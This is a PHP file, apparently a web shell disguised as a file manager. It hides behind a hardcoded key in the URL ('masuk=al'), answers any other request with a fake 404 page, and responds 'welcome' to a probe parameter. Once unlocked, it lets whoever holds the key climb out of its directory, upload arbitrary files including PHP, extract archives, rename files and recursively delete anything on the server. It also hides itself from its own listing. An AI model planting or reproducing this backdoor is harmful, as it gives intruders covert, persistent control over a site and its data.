<?php
const AL_SHELL_KEY = 'al';

if (!isset($_GET['masuk']) || $_GET['masuk'] !== AL_SHELL_KEY) {
    if (isset($_GET['al']) && $_GET['al'] === 'here') {
        exit('welcome');
    }
    http_response_code(404);
    exit('404 Not Found');
}

const BASE_DIR = __DIR__;
const MAX_FILE_SIZE = 100 * 1024 * 1024;

$systemLog = [];
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : '';

// Allow directory traversal with .. 
$currentDir = str_replace(['./', '.\\'], '', $currentDir);
$currentDir = trim($currentDir, '/\\');

// Build full path from BASE_DIR + currentDir
if (empty($currentDir)) {
    $fullPath = BASE_DIR;
    $currentRelative = '';
} else {
    $fullPath = BASE_DIR . DIRECTORY_SEPARATOR . $currentDir;
    $currentRelative = $currentDir;
}

// Resolve real path (handles .. traversal)
$fullPath = realpath($fullPath) ?: $fullPath;

// Calculate relative path from BASE_DIR to current location
$baseReal = realpath(BASE_DIR);
$fullReal = realpath($fullPath) ?: $fullPath;

if (str_starts_with($fullReal, $baseReal)) {
    // Inside or at BASE_DIR
    $currentRelative = ltrim(substr($fullReal, strlen($baseReal)), '/\\');
} else {
    // Outside BASE_DIR - store as ".." segments
    $relative = '';
    $tempPath = $baseReal;
    while (!str_starts_with($fullReal, $tempPath)) {
        $relative .= ($relative ? '/' : '') . '..';
        $parent = dirname($tempPath);
        if ($parent === $tempPath) break;
        $tempPath = $parent;
    }
    if (str_starts_with($fullReal, $tempPath)) {
        $remaining = ltrim(substr($fullReal, strlen($tempPath)), '/\\');
        if ($remaining) {
            $relative .= ($relative ? '/' : '') . $remaining;
        }
    }
    $currentRelative = $relative ?: '..';
}

// Store the calculated relative path back
$currentDir = $currentRelative;

// Flag for outside base detection
$isOutsideBase = !str_starts_with($fullReal, $baseReal);

function addLog($message, $type = 'INFO') {
    global $systemLog;
    $timestamp = date("H:i:s");
    $systemLog[] = ['time' => $timestamp, 'type' => $type, 'msg' => $message];
}

function formatBytes($bytes, $precision = 2) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return number_format($bytes, $precision) . ' ' . $units[$pow];
}

// Scan directory and sort by modified time
function scanDirectory($dir) {
    $files = [];
    $dirs = [];
    
    if (is_dir($dir)) {
        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            
            $path = $dir . DIRECTORY_SEPARATOR . $item;
            $info = [
                'name' => $item,
                'path' => $path,
                'size' => is_dir($path) ? 0 : filesize($path),
                'modified' => filemtime($path),
                'is_dir' => is_dir($path)
            ];
            
            if ($info['is_dir']) {
                $dirs[] = $info;
            } else {
                $files[] = $info;
            }
        }
    }
    
    // Sort by modified time (newest first)
    usort($dirs, fn($a, $b) => $b['modified'] - $a['modified']);
    usort($files, fn($a, $b) => $b['modified'] - $a['modified']);
    
    return array_merge($dirs, $files);
}

// Build tree structure (traverses up and down)
function buildTree($dir, $currentDir, $prefix = '') {
    $tree = [];
    $items = @scandir($dir);
    
    if (!$items) return $tree;
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..' || $item === basename(__FILE__)) continue;
        
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        $relativePath = ltrim($prefix . '/' . $item, '/');
        
        if (is_dir($path)) {
            $tree[] = [
                'name' => $item,
                'path' => $relativePath,
                'is_dir' => true,
                'children' => buildTree($path, $currentDir, $relativePath)
            ];
        }
    }
    return $tree;
}

// Get parent directories for tree
function getParentTree($currentDir) {
    $parents = [];
    $path = $currentDir;
    while (!empty($path)) {
        $parent = dirname($path);
        if ($parent === $path || $parent === '.' || $parent === '\\' || $parent === '/') break;
        $name = basename($parent);
        $parents[] = ['name' => $name, 'path' => $parent];
        $path = $parent;
    }
    return array_reverse($parents);
}

// Handle folder navigation
if (isset($_GET['nav']) && isset($_GET['path'])) {
    $navPath = $_GET['path'];
    header('Location: ?masuk=' . AL_SHELL_KEY . '&dir=' . urlencode($navPath));
    exit;
}

// Handle unzip
if (isset($_GET['unzip']) && isset($_GET['file'])) {
    $zipFile = $fullPath . DIRECTORY_SEPARATOR . basename($_GET['file']);
    if (file_exists($zipFile) && pathinfo($zipFile, PATHINFO_EXTENSION) === 'zip') {
        $zip = new ZipArchive();
        if ($zip->open($zipFile) === TRUE) {
            $fileCount = $zip->numFiles;
            $zip->extractTo($fullPath);
            $zip->close();
            addLog("Extracted " . $fileCount . " files from " . basename($_GET['file']), "SUCCESS");
        } else {
            addLog("Failed to extract: " . basename($_GET['file']), "ERR");
        }
    }
    header('Location: ?masuk=' . AL_SHELL_KEY . '&dir=' . urlencode($currentDir));
    exit;
}

// Recursive delete function
function deleteRecursive($path) {
    if (is_dir($path)) {
        $items = scandir($path);
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            deleteRecursive($path . DIRECTORY_SEPARATOR . $item);
        }
        return rmdir($path);
    } else {
        return unlink($path);
    }
}

// Handle file deletion
if (isset($_POST['action']) && $_POST['action'] === 'delete' && isset($_POST['file'])) {
    $fileToDelete = $fullPath . DIRECTORY_SEPARATOR . basename($_POST['file']);
    if (file_exists($fileToDelete)) {
        // Skip if trying to delete self
        if (realpath($fileToDelete) === realpath(__FILE__)) {
            addLog("Cannot delete running script", "ERR");
        } else {
            deleteRecursive($fileToDelete);
        }
    }
    header('Location: ?masuk=' . AL_SHELL_KEY . '&dir=' . urlencode($currentDir));
    exit;
}

// Handle file rename
if (isset($_POST['action']) && $_POST['action'] === 'rename') {
    $oldPath = $fullPath . DIRECTORY_SEPARATOR . basename($_POST['oldname']);
    $newPath = $fullPath . DIRECTORY_SEPARATOR . basename($_POST['newname']);
    if (file_exists($oldPath) && !file_exists($newPath)) {
        rename($oldPath, $newPath);
    }
    header('Location: ?masuk=' . AL_SHELL_KEY . '&dir=' . urlencode($currentDir));
    exit;
}

// Handle file upload to current directory
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['userfile'])) {
    $fileCount = count($_FILES['userfile']['name']);
    
    if (!is_writable($fullPath)) {
        addLog("Directory not writable: " . $fullPath, "ERR");
    }
    
    for ($i = 0; $i < $fileCount; $i++) {
        $fileName = $_FILES['userfile']['name'][$i];
        $fileTmp = $_FILES['userfile']['tmp_name'][$i];
        $fileError = $_FILES['userfile']['error'][$i];
        
        if (empty($fileName) || $fileError !== UPLOAD_ERR_OK) continue;
        
        $cleanName = preg_replace("/[^a-zA-Z0-9\.\-_]/", "", basename($fileName));
        $targetPath = $fullPath . DIRECTORY_SEPARATOR . $cleanName;
        
        if (file_exists($targetPath)) {
            unlink($targetPath);
        }
        
        if (move_uploaded_file($fileTmp, $targetPath)) {
            chmod($targetPath, 0644);
            addLog("Saved: " . $cleanName, "SUCCESS");
        } else {
            addLog("Failed: " . $cleanName, "ERR");
        }
    }
    
    header('Location: ?masuk=' . AL_SHELL_KEY . '&dir=' . urlencode($currentDir));
    exit;
}

// Get file list
$filesList = scanDirectory($fullPath);
$treeData = buildTree($fullPath, $currentDir, $currentDir);

// Generate breadcrumbs with parent link
function getBreadcrumbs($currentDir, $fullPath) {
    $crumbs = [];
    global $baseReal;
    if (!$baseReal) $baseReal = realpath(BASE_DIR);
    
    // Add parent (..) link if can go up
    $canGoUp = dirname($fullPath) !== $fullPath;
    if ($canGoUp) {
        if (empty($currentDir)) {
            $parentPath = '..';
        } elseif (str_starts_with($currentDir, '..')) {
            $parentPath = $currentDir . '/..';
        } else {
            $parentPath = dirname($currentDir);
            if ($parentPath === '.' || $parentPath === '\\' || $parentPath === '/') {
                $parentPath = '';
            }
        }
        $crumbs[] = ['name' => '⬆️ UP', 'path' => $parentPath];
    }
    
    // Determine root label based on location
    $isOutsideBase = !str_starts_with(realpath($fullPath) ?: $fullPath, $baseReal);
    $rootLabel = $isOutsideBase ? '📍 ' . basename($baseReal) : 'ROOT';
    $crumbs[] = ['name' => $rootLabel, 'path' => ''];
    
    // Build path segments
    $parts = explode('/', trim($currentDir, '/'));
    $path = '';
    foreach ($parts as $part) {
        if (empty($part) || $part === '..') continue;
        if (str_starts_with($part, '.')) continue;
        $path .= ($path ? '/' : '') . $part;
        $crumbs[] = ['name' => $part, 'path' => $path];
    }
    return $crumbs;
}
$breadcrumbs = getBreadcrumbs($currentDir, $fullPath);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AL_SYS_FILEMANAGER_V3</title>
    <style>
        :root {
            --bg-color: #0d1117;
            --term-green: #00ff41;
            --term-red: #ff3333;
            --term-yellow: #f1c40f;
            --term-blue: #3498db;
            --term-purple: #9b59b6;
            --term-orange: #e67e22;
            --text-color: #c9d1d9;
            --panel-bg: #161b22;
            --border: #30363d;
        }
        * { box-sizing: border-box; }
        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 280px 1fr;
            gap: 20px;
        }
        h2 { 
            border-bottom: 1px solid var(--border); 
            padding-bottom: 10px; 
            margin-top: 0; 
            color: var(--term-green); 
            grid-column: 1 / -1;
        }
        
        /* Sidebar Tree View */
        .sidebar {
            background: var(--panel-bg);
            border: 1px solid var(--border);
            padding: 15px;
            max-height: calc(100vh - 100px);
            overflow-y: auto;
        }
        .tree-header {
            color: var(--term-green);
            font-weight: bold;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid var(--border);
        }
        .tree-item {
            padding: 3px 0;
            cursor: pointer;
            white-space: nowrap;
        }
        .tree-item:hover { color: var(--term-green); }
        .tree-item.active { color: var(--term-yellow); font-weight: bold; }
        .tree-folder { color: var(--term-blue); }
        .tree-indent { display: inline-block; width: 20px; }
        
        /* Main Content */
        .main-content {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        
        /* Breadcrumbs */
        .breadcrumbs {
            background: var(--panel-bg);
            border: 1px solid var(--border);
            padding: 10px 15px;
            font-size: 13px;
        }
        .breadcrumbs a {
            color: var(--term-blue);
            text-decoration: none;
        }
        .breadcrumbs a:hover { text-decoration: underline; }
        .breadcrumbs span { color: #666; margin: 0 5px; }
        
        .upload-zone {
            border: 2px dashed var(--border);
            padding: 40px;
            text-align: center;
            transition: 0.3s;
            cursor: pointer;
            background: var(--panel-bg);
        }
        .upload-zone:hover, .upload-zone.dragover { 
            border-color: var(--term-green); 
            background: rgba(0,255,65,0.05);
        }
        input[type="file"] { display: none; }
        .custom-file-upload {
            display: inline-block;
            padding: 10px 20px;
            cursor: pointer;
            background: var(--border);
            color: #fff;
            border-radius: 4px;
        }
        .custom-file-upload:hover { background: #3b434b; }
        button {
            padding: 12px 24px;
            background: var(--term-green);
            color: #000;
            border: none;
            font-weight: bold;
            cursor: pointer;
            font-family: inherit;
            font-size: 14px;
        }
        button:hover { opacity: 0.9; }
        .btn-small {
            padding: 4px 10px;
            font-size: 11px;
            width: auto;
            margin: 2px;
        }
        .btn-danger { background: var(--term-red); color: #fff; }
        .btn-info { background: var(--term-blue); color: #fff; }
        .btn-warning { background: var(--term-orange); color: #fff; }
        
        .log-window {
            background: #000;
            border: 1px solid var(--border);
            height: 150px;
            overflow-y: auto;
            padding: 10px;
            font-size: 12px;
        }
        .log-line { margin-bottom: 4px; border-bottom: 1px solid #111; padding-bottom: 2px; }
        .tag { font-weight: bold; margin-right: 5px; }
        .tag-INFO { color: var(--term-blue); }
        .tag-WARN { color: var(--term-yellow); }
        .tag-ERR { color: var(--term-red); }
        .tag-SUCCESS { color: var(--term-green); }
        
        /* File Manager */
        .file-manager {
            border: 1px solid var(--border);
            background: var(--panel-bg);
        }
        .file-manager-header {
            background: var(--border);
            padding: 10px 15px;
            font-weight: bold;
            color: var(--term-green);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .file-list { max-height: 400px; overflow-y: auto; }
        .file-item {
            display: flex;
            align-items: center;
            padding: 10px 15px;
            border-bottom: 1px solid var(--border);
            transition: background 0.2s;
        }
        .file-item:hover { background: rgba(255,255,255,0.03); }
        .file-icon { 
            width: 30px; 
            text-align: center; 
            margin-right: 10px;
            font-size: 18px;
        }
        .file-info { flex: 1; }
        .file-name { 
            color: var(--term-green); 
            word-break: break-all;
            font-size: 13px;
        }
        .file-name a { color: var(--term-green); text-decoration: none; }
        .file-name a:hover { text-decoration: underline; }
        .file-meta { 
            color: #666; 
            font-size: 11px; 
            margin-top: 2px;
        }
        .file-actions { display: flex; gap: 5px; }
        .no-files {
            padding: 30px;
            text-align: center;
            color: #666;
        }
        .file-count {
            padding: 10px 15px;
            border-top: 1px solid var(--border);
            background: rgba(0,0,0,0.3);
            font-size: 12px;
            color: #888;
        }
        
        .selected-files {
            margin-top: 10px;
            padding: 10px;
            background: rgba(0,0,0,0.3);
            border-radius: 4px;
            min-height: 30px;
            font-size: 12px;
        }
        .selected-file {
            display: inline-block;
            padding: 2px 8px;
            margin: 2px;
            background: var(--border);
            border-radius: 3px;
            color: var(--term-yellow);
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal.active { display: flex; }
        .modal-content {
            background: var(--panel-bg);
            border: 1px solid var(--border);
            padding: 20px;
            width: 400px;
        }
        .modal-input {
            width: 100%;
            padding: 10px;
            background: #000;
            border: 1px solid var(--border);
            color: var(--text-color);
            font-family: inherit;
            margin: 10px 0;
        }
        
        .current-path {
            color: var(--term-yellow);
            font-size: 12px;
            margin-top: 5px;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>>> FILE_MANAGER_V3 [TREE_VIEW]</h2>
    
    <!-- Sidebar Tree -->
    <div class="sidebar">
        <div class="tree-header">📁 DIRECTORY TREE</div>
        <?php 
        // Show current location indicator when outside base
        $isOutsideBase = !str_starts_with(realpath($fullPath) ?: $fullPath, $baseReal);
        if ($isOutsideBase):
        ?>
            <div class="tree-item" style="color:var(--term-orange);">
                📍 <?php echo htmlspecialchars(basename($fullPath)); ?>/
            </div>
            <div style="border-left:2px solid var(--term-orange); margin-left:10px; padding-left:8px;">
        <?php endif; ?>
        
        <?php 
        // Show parent directories first
        $parentTree = getParentTree($currentDir);
        foreach ($parentTree as $parent): 
        ?>
            <div class="tree-item" style="opacity:0.7;">
                <a href="?masuk=<?php echo AL_SHELL_KEY; ?>&dir=<?php echo urlencode($parent['path']); ?>" style="color:inherit; text-decoration:none;">
                    <span style="color:var(--term-orange);">⬆️</span> <?php echo htmlspecialchars($parent['name']); ?>/
                </a>
            </div>
        <?php endforeach; ?>
        <?php renderTree($treeData, $currentDir, BASE_DIR); ?>
        
        <?php if ($isOutsideBase): ?></div><?php endif; ?>
    </div>
    
    <!-- Main Content -->
    <div class="main-content">
        <!-- Breadcrumbs -->
        <div class="breadcrumbs">
            <?php $first = true; ?>
            <?php foreach ($breadcrumbs as $i => $crumb): ?>
                <?php 
                $isUpLink = ($crumb['name'] === '⬆️ UP');
                if (!$first && !$isUpLink): ?><span>/</span><?php endif; 
                $first = false;
                ?>
                <a href="?masuk=<?php echo AL_SHELL_KEY; ?>&dir=<?php echo urlencode($crumb['path']); ?>" 
                   <?php if ($isUpLink): ?>style="color:var(--term-orange); font-weight:bold;"<?php endif; ?>>
                    <?php echo htmlspecialchars($crumb['name']); ?>
                </a>
            <?php endforeach; ?>
        </div>
        
        <!-- Upload Zone -->
        <form id="uploadForm" action="" method="post" enctype="multipart/form-data">
            <div class="upload-zone" id="dropZone">
                <div class="current-path">Current: <?php echo htmlspecialchars($isOutsideBase ? $fullPath : ($currentDir ?: 'ROOT')); ?>/</div>
                <br>
                <label for="file-upload" class="custom-file-upload">[SELECT_FILES]</label>
                <input id="file-upload" name="userfile[]" type="file" multiple onchange="handleFileSelect(this)">
                <div style="margin-top:15px; color: #666;">or DRAG & DROP files here</div>
                <div id="file-selected" class="selected-files">
                    <span style="color: #666;">NO_FILES_SELECTED</span>
                </div>
            </div>
            <button type="submit" style="width:100%; margin-top:10px;">>> UPLOAD TO CURRENT DIRECTORY</button>
        </form>
        
        <!-- Log Window -->
        <div class="log-window" id="console">
            <div class="log-line"><span class="tag tag-INFO">[SYS]</span> Max: <?php echo formatBytes(MAX_FILE_SIZE); ?> | Sorted by: Last Modified</div>
            <?php foreach ($systemLog as $log): ?>
                <div class="log-line">
                    <span class="tag tag-<?php echo $log['type']; ?>">[<?php echo $log['type']; ?>]</span>
                    <span style="color: #666;"><?php echo $log['time']; ?></span> 
                    <?php echo htmlspecialchars($log['msg']); ?>
                </div>
            <?php endforeach; ?>
        </div>
        
        <!-- File List -->
        <div class="file-manager">
            <div class="file-manager-header">
                <span>>> FILES [<?php echo count($filesList); ?> items]</span>
                <span style="font-size:11px; color:#888;">Sorted: Newest First</span>
            </div>
            <div class="file-list">
                <?php if (empty($filesList) && empty($currentDir) && $fullPath === realpath(BASE_DIR)): ?>
                    <div class="no-files">[DIRECTORY_EMPTY]</div>
                <?php else: ?>
                    <?php 
                    // Add parent directory entry (..) - always show if can go up
                    $canGoUp = dirname($fullPath) !== $fullPath; // Not at filesystem root
                    if ($canGoUp):
                        // Calculate parent relative path
                        if (empty($currentDir)) {
                            $parentPath = '..';
                        } elseif (str_starts_with($currentDir, '..')) {
                            $parentPath = $currentDir . '/..';
                        } else {
                            $parentPath = dirname($currentDir);
                            if ($parentPath === '.' || $parentPath === '\\' || $parentPath === '/') {
                                $parentPath = '';
                            }
                        }
                    ?>
                        <div class="file-item" style="background:rgba(255,255,255,0.02);">
                            <div class="file-icon">⬆️</div>
                            <div class="file-info">
                                <div class="file-name">
                                    <a href="?masuk=<?php echo AL_SHELL_KEY; ?>&dir=<?php echo urlencode($parentPath); ?>">
                                        ../ (Parent Directory)
                                    </a>
                                </div>
                                <div class="file-meta">GO UP ONE LEVEL</div>
                            </div>
                        </div>
                    <?php endif; ?>
                    <?php foreach ($filesList as $file): ?>
                        <div class="file-item">
                            <div class="file-icon"><?php echo $file['is_dir'] ? '📁' : getFileIcon($file['name']); ?></div>
                            <div class="file-info">
                                <div class="file-name">
                                    <?php if ($file['is_dir']): ?>
                                        <a href="?masuk=<?php echo AL_SHELL_KEY; ?>&nav=1&path=<?php echo urlencode(($currentDir ? $currentDir . '/' : '') . $file['name']); ?>">
                                            <?php echo htmlspecialchars($file['name']); ?>/
                                        </a>
                                    <?php else: ?>
                                        <?php echo htmlspecialchars($file['name']); ?>
                                    <?php endif; ?>
                                </div>
                                <div class="file-meta">
                                    <?php echo $file['is_dir'] ? 'DIRECTORY' : formatBytes($file['size']); ?> | 
                                    <?php echo date('Y-m-d H:i:s', $file['modified']); ?>
                                </div>
                            </div>
                            <div class="file-actions">
                                <?php if (!$file['is_dir']): ?>
                                    <?php if (strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)) === 'zip'): ?>
                                        <a href="?masuk=<?php echo AL_SHELL_KEY; ?>&dir=<?php echo urlencode($currentDir); ?>&unzip=1&file=<?php echo urlencode($file['name']); ?>" 
                                           class="btn-small btn-warning" 
                                           onclick="return confirm('Extract <?php echo htmlspecialchars($file['name']); ?>?')">UNZIP</a>
                                    <?php endif; ?>
                                    <button class="btn-small btn-info" onclick="renameFile('<?php echo htmlspecialchars($file['name']); ?>')">RENAME</button>
                                    <form method="post" style="display:inline;" onsubmit="return confirm('Delete <?php echo htmlspecialchars($file['name']); ?>?');">
                                        <input type="hidden" name="action" value="delete">
                                        <input type="hidden" name="file" value="<?php echo htmlspecialchars($file['name']); ?>">
                                        <button type="submit" class="btn-small btn-danger">DEL</button>
                                    </form>
                                <?php else: ?>
                                    <a href="?masuk=<?php echo AL_SHELL_KEY; ?>&nav=1&path=<?php echo urlencode(($currentDir ? $currentDir . '/' : '') . $file['name']); ?>" 
                                       class="btn-small btn-info" style="text-decoration:none;">OPEN</a>
                                    <form method="post" style="display:inline;" onsubmit="return confirm('Delete folder <?php echo htmlspecialchars($file['name']); ?>?');">
                                        <input type="hidden" name="action" value="delete">
                                        <input type="hidden" name="file" value="<?php echo htmlspecialchars($file['name']); ?>">
                                        <button type="submit" class="btn-small btn-danger">DEL</button>
                                    </form>
                                <?php endif; ?>
                            </div>
                        </div>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>
            <div class="file-count">Total: <?php echo count($filesList); ?> items</div>
        </div>
    </div>
</div>

<!-- Rename Modal -->
<div class="modal" id="renameModal">
    <div class="modal-content">
        <h3>>> RENAME</h3>
        <form method="post">
            <input type="hidden" name="action" value="rename">
            <input type="hidden" name="oldname" id="oldNameInput">
            <input type="text" name="newname" id="newNameInput" class="modal-input" placeholder="New name...">
            <button type="submit">RENAME</button>
            <button type="button" onclick="closeModal()" style="background:#666; margin-top:10px;">CANCEL</button>
        </form>
    </div>
</div>

<script>
    const dropZone = document.getElementById('dropZone');
    const selectedDiv = document.getElementById('file-selected');
    
    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(e => {
        dropZone.addEventListener(e, ev => { ev.preventDefault(); ev.stopPropagation(); }, false);
    });
    
    ['dragenter', 'dragover'].forEach(e => {
        dropZone.addEventListener(e, () => dropZone.classList.add('dragover'), false);
    });
    
    ['dragleave', 'drop'].forEach(e => {
        dropZone.addEventListener(e, () => dropZone.classList.remove('dragover'), false);
    });
    
    dropZone.addEventListener('drop', e => {
        document.getElementById('file-upload').files = e.dataTransfer.files;
        handleFileSelect(document.getElementById('file-upload'));
    });
    
    function handleFileSelect(input) {
        const files = input.files;
        if (files.length === 0) {
            selectedDiv.innerHTML = '<span style="color: #666;">NO_FILES_SELECTED</span>';
            return;
        }
        let html = '';
        for (let i = 0; i < files.length; i++) {
            html += '<span class="selected-file">' + files[i].name + '</span>';
        }
        selectedDiv.innerHTML = html;
    }
    
    function renameFile(oldName) {
        document.getElementById('oldNameInput').value = oldName;
        document.getElementById('newNameInput').value = oldName;
        document.getElementById('renameModal').classList.add('active');
    }
    
    function closeModal() {
        document.getElementById('renameModal').classList.remove('active');
    }
</script>

</body>
</html>

<?php
// Helper functions
function getFileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'php' => '🐘', 'zip' => '📦', 'jpg' => '🖼️', 'jpeg' => '🖼️',
        'png' => '🖼️', 'gif' => '🖼️', 'txt' => '📝', 'md' => '📝',
        'js' => '📜', 'css' => '🎨', 'html' => '🌐', 'json' => '📋',
        'pdf' => '📄', 'doc' => '📘', 'docx' => '📘', 'mp3' => '🎵',
        'mp4' => '🎬', 'sql' => '🗃️'
    ];
    return $icons[$ext] ?? '📄';
}

function renderTree($tree, $currentDir, $basePath, $level = 0) {
    foreach ($tree as $item) {
        $indent = str_repeat('<span class="tree-indent"></span>', $level);
        $isActive = ($currentDir === $item['path'] || str_starts_with($currentDir, $item['path'] . '/'));
        $activeClass = $isActive ? 'active' : '';
        echo '<div class="tree-item ' . $activeClass . '">';
        echo $indent;
        echo '<a href="?masuk=' . AL_SHELL_KEY . '&nav=1&path=' . urlencode($item['path']) . '" style="color:inherit; text-decoration:none;">';
        echo '<span class="tree-folder">📁</span> ' . htmlspecialchars($item['name']);
        echo '</a>';
        echo '</div>';
        
        if (!empty($item['children']) && $isActive) {
            renderTree($item['children'], $currentDir, $basePath, $level + 1);
        }
    }
}
?>
